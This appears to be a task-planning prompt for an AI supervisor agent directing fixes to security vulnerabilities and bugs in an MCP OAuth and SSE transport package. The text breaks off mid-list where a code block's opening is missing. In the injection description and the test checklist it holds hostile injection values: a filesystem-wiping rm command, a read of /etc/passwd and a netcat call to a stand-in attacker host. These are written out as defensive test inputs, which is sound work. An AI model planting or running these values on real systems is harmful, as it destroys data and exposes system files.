# OAuth & SSE Transport Implementation - Phase 4: Critical Security Fixes & Major Bug Resolution

## ðŸ”´ CRITICAL SECURITY NOTICE
**This phase addresses CRITICAL SECURITY VULNERABILITIES and MAJOR BUGS that make the current implementation unsafe and non-functional for production use. ALL tasks in this phase are HIGH PRIORITY and MUST be completed.**

## Your responsibility
**BEFORE** creating tasks, keep in mind:
- you need to assess the current state first
- make sure to detect existing packages (recursively, use a scan for package.json, excluding **/node_modules/**)
  to understand the repo first, then check relevant files for focus.
- Remember: you are the supervisor and at this stage your main responsibility is to make sure that the implementation
  is correct. Your context is "reserved" to be bloated with useful input tokens, so go ahead, use code-reasoning MCP to get a full understanding of current implementation status.
- You **MUST** make sure that scope is clear, that there will be no duplications implemented,
  and that the tasks are small enough to be handled by an engineer.
- Your job is **NOT** to please the user, but to support them that beginning with an epic, throughout the implementation
  everything is clear, small enough, and that the implementation is correct and well-aligned.
- Your job **IS** to ask questions to the user to clarify the scope and to identify possible blockers and risks.

## CRITICAL:

- **NEVER** touch tsconfig.json or any configuration files without **EXPLICIT** user approval
- **NEVER** remove or delete tests or test files - that's a **CRIME** against our methodology
- **NEVER** touch source code - it's not your job as supervisor to touch code. **You have subagent workers for that.**
- **NEVER** skip security validation steps - each fix must be thoroughly tested for security
- **ALWAYS** use execFile instead of exec for shell commands to prevent injection
- **ALWAYS** validate and sanitize all user input before use in system operations

## Before starting

**BEFORE** starting a new phase, you **MUST** create tasks that are optimized for parallel work,
so it should be **NO** work on the same files in parallel.
Then start instances of subagent worker IN PARALLEL to work on the tasks and coordinate them.
Use as many PARALLEL worker instances as useful - CONSIDER dependencies so do NOT launch workers
in parallel that have dependencies that are not implemented or will be worked on in other tasks.

To start parallel subagent workers, you **MUST** send a single message with multiple Task tool calls.

## Supervisor Verification Protocol

**AFTER EACH WORKER COMPLETES**, the supervisor MUST:
1. [ ] Run `git status` to verify files are tracked
2. [ ] Run `yarn validate packages/mcp` personally
3. [ ] Run `yarn test packages/mcp` personally
4. [ ] Use code-reasoning tool to review changes
5. [ ] **NEW: Run security-specific tests for vulnerabilities**
6. [ ] Commit all files with `git add` and `git commit`
7. [ ] Update task checkboxes in this document
8. [ ] Only then proceed to dependent tasks

## Critical Issues Identified

### 1. Critical Security Vulnerabilities

#### ðŸ”´ A) Command Injection in `KeychainTokenStorage`
**Severity: CRITICAL - Remote Code Execution**
- **File**: packages/mcp/src/auth/implementations/keychain-token-storage.ts
- **Vulnerability**: User-controlled `serverId` directly interpolated into shell commands
- **Impact**: Attackers can execute arbitrary commands (e.g., `rm -rf /`, `cat /etc/passwd`)
- **Example Attack**: serverId = `"; rm -rf / #"` would delete the entire filesystem

#### ðŸ”´ B) Auth Token Leakage in URLs
**Severity: HIGH - Credential Exposure**
- **File**: packages/mcp/src/transports/implementations/sse-client-transport.ts
- **Vulnerability**: Auth tokens passed as URL query parameters
- **Impact**: Tokens exposed in server logs, shell history, network monitoring tools
- **Note**: The "browser limitation" justification is FALSE - this runs in Node.js where headers are supported

### 2. Major Bugs & Design Flaws

#### ðŸ”´ A) Broken Request-Response Handling
**Severity: CRITICAL - Complete RPC Failure**
- **File**: packages/mcp/src/transports/implementations/base-client-transport.ts
- **Bug**: Promise handlers are no-ops (`resolve: () => {}, reject: () => {}`)
- **Impact**: RPC calls never receive responses, making the transport non-functional

#### ðŸ”´ B) Broken OAuth State Management & Race Conditions
**Severity: HIGH - Authentication Failures**
- **Files**: packages/mcp/src/auth/implementations/oauth2-authorization-code.ts, packages/mcp/src/index.ts
- **Issues**:
  1. Single `pendingAuth` variable causes race conditions
  2. `completeOAuthFlow` creates new instances without pending state
  3. O(n) iteration through all servers to find OAuth state

#### ðŸ”´ C) Memory Leak from Event Listeners
**Severity: MEDIUM - Resource Exhaustion**
- **File**: packages/mcp/src/transports/implementations/sse-client-transport.ts
- **Bug**: `.bind(this)` creates new function instances, preventing removal
- **Impact**: Memory leaks in long-running processes

#### ðŸ”´ D) Broken Transport Replacement Logic
**Severity: HIGH - OAuth Header Loss**
- **File**: packages/mcp/src/transports/implementations/streamable-http-client-transport.ts
- **Bug**: `Object.assign` doesn't properly copy internal state/getters/setters
- **Impact**: OAuth headers not applied after transport upgrade

### 3. Code Quality and DRY Violations

- **Inconsistent Error Handling**: Two competing patterns for TransportError
- **Duplicated Validation Logic**: URL/config validation scattered across multiple files
- **Redundant StdioClientTransport**: Legacy version remains alongside refactored version
- **Incorrect Error Handling**: `isValid()` returns boolean but code tries to catch exceptions

## Phase 4 Objectives

### Primary Goal
**Fix all critical security vulnerabilities, major bugs, and design flaws to make the implementation production-ready.**

### Success Criteria
- [x] Zero command injection vulnerabilities
- [x] Zero credential exposure in logs/URLs

// Validation
const SAFE_SERVER_ID_REGEX = /^[a-zA-Z0-9._-]+$/;
if (!SAFE_SERVER_ID_REGEX.test(serverId)) {
  throw new Error('Invalid serverId: contains unsafe characters');
}

// Safe command execution
import { execFile } from 'child_process';
execFile('security', ['add-generic-password', '-a', serverId, '-s', 'mcp-oauth', '-w', token], callback);
```

**Security tests to add:**
- [ ] Test with malicious inputs: `; rm -rf /`, `$(cat /etc/passwd)`, `|nc attacker.com 1234`
- [ ] Test with special characters: `'`, `"`, `` ` ``, `$`, `&`, `|`, `;`, `\n`
- [ ] Verify no shell interpretation occurs
- [ ] Test valid serverIds still work

**DO NOT** proceed to next task until:
- [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
